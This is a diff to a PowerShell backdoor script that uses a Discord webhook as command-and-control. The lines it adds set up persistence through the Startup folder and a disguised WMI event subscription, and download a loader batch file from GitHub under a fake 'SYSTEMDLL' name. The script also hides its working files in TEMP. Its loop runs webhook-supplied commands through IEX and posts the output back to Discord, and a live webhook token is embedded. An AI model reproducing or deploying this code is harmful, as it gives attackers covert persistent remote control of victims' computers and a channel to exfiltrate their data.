@@ -1,23 +1,76 @@
-$uri = "https://discord.com/api/webhooks/965959164440481842/NzKBTgEAYJ3Y6m-LOPY89ZshFQ4OPY_GKN-DfNHroQyfEviGvT3X_6ybntF2S7jaBj1m"
+
+$temp = $env:TEMP;
+$userprof = $env:USERPROFILE;
+$startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
+$EventFilterName = 'Dcom Launcher';
+$load = "$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat";
+$uri = "https://discord.com/api/webhooks/965959164440481842/NzKBTgEAYJ3Y6m-LOPY89ZshFQ4OPY_GKN-DfNHroQyfEviGvT3X_6ybntF2S7jaBj1m";
+
+$ADMIN = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'
+
+if ($ADMIN -eq $false){
+    copy-item $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat -Destination $startUpFolder
+    $hash = @{ "content" = "not admin.....persistence my not work"; }
+    $JSON = $hash | convertto-json
+    Invoke-WebRequest -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}
+
+}
+$path = test-path $load
+if($path -eq $true){
+    $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325";
+    $EventFilterArgs = @{
+        EventNamespace = 'root\cimv2'
+        Name = $EventFilterName
+        Query = $Query
+        QueryLanguage = 'WQL'
+    }
+
+    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs
+
+    # Create CommandLineEventConsumer
+    $CommandLineConsumerArgs = @{
+        Name = $EventConsumerName
+        CommandLineTemplate = $load
+    }
+    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs
+
+    # Create FilterToConsumerBinding
+    $FilterToConsumerArgs = @{
+        Filter = $Filter
+        Consumer = $Consumer
+    }
+    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
+
+}else{
+    $wc = [System.Net.WebClient]::new();
+    $loader = "https://raw.githubusercontent.com/ghostleaper/rhino/main/loader";
+    $wc.DownloadFile("$loader","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat");
+
+    $hash = @{ "content" = "error during persistence"; }
+    $JSON = $hash | convertto-json
+    Invoke-WebRequest -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}
+}
 
 try {
-    do {       
+    do {  
+        
+
         $response = Invoke-WebRequest -Uri $uri
         $jsonObj = ConvertFrom-Json $([String]::new($response.Content))        
         
-        $jsonobj | select 'name' | out-file -filepath .\text34.txt
-        $jsonobj1 = (Get-Content -Path ".\text34.txt" -tail 3) | Select-object -First 1 
-        $files = (Get-Content -Path ".\text34.txt" -tail 3) | Select-object -First 1 | out-file -append gg.txt
-        $jsonobj2 = (Get-Content -Path ".\gg.txt" -tail 1) | out-file qna.txt
+        $jsonobj | select 'name' | out-file -filepath $temp\9hdmNxcUguHounsfIr72.txt
+        $jsonobj1 = (Get-Content -Path "$temp\9hdmNxcUguHounsfIr72.txt" -tail 3) | Select-object -First 1 
+        $files = (Get-Content -Path "$temp\9hdmNxcUguHounsfIr72.txt" -tail 3) | Select-object -First 1 | out-file -append $temp\LOl0InkQOQcrfIbUhToe.txt
+        $jsonobj2 = (Get-Content -Path "$temp\LOl0InkQOQcrfIbUhToe.txt" -tail 1) | out-file $temp\qna.txt
                
         
-        $a = (Get-Content ".\gg.txt" -tail 2)
-        $b = (Get-Content ".\gg.txt" -tail 1)
+        $a = (Get-Content "$temp\LOl0InkQOQcrfIbUhToe.txt" -tail 2)
+        $b = (Get-Content "$temp\LOl0InkQOQcrfIbUhToe.txt" -tail 1)
         if ($a -ne $b){
-            $rut = IEX($jsonobj1) | out-file sys.txt 
+            $rut = IEX($jsonobj1) | out-file $temp\mjCKMCrnUsANf3fXvZ5l.txt 
                     
-            $fileName = "sys.txt"        
-            $currentPath = Convert-Path .
+            $fileName = "mjCKMCrnUsANf3fXvZ5l.txt"        
+            $currentPath = $temp
             $filePath="$currentPath\$fileName"
         
             $fileBin = [System.IO.File]::ReadAlltext($filePath)
@@ -33,7 +86,7 @@ try {
         
             Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
         
-        }
+        }        
 
     } until ( $response.StatusCode -eq [System.Net.HttpStatusCode]::NotFound )
 }
@@ -41,3 +94,4 @@ catch {
      # catches 404 too
      Write-Debug "StatusCode: $($_.Exception.Response.StatusCode.Value__)"
 }
+
